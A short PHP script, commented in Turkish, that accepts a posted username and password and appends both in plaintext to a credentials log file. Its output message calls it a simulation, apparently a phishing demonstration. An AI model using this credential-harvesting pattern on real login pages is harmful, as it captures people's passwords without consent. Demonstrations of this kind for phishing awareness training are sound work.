<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Verileri log dosyasına kaydet
    $file = fopen('../logs/credentials.txt', 'a');
    fwrite($file, "PHP -> Kullanıcı Adı: $username, Şifre: $password\n");
    fclose($file);
    
    echo "PHP üzerinden veriler alındı. Bu sadece bir simülasyondur.";
}
?>
